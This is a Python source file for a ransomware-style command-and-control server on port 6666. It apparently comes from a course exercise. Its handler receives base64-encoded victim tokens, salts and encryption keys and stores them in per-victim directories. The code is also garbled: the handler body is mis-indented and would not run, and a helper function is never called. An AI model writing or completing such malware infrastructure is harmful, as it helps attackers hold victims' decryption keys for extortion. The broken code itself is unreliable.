import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
         # Get token, salt and key from JSON data
    token = base64.b64decode(body["token"])
    salt = base64.b64decode(body["salt"])
    key = base64.b64decode(body["key"])

    # Create directory based on token
    token_hash = sha256(token).hexdigest()
    directory = os.path.join(path, token_hash)
    os.makedirs(directory, exist_ok=True)

    # Write salt and key to files in directory
    with open(os.path.join(directory, "salt.bin"), "wb") as f:
        f.write(salt)
    with open(os.path.join(directory, "key.bin"), "wb") as f:
        f.write(key)

    # Return JSON response
    return {"status": "success"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()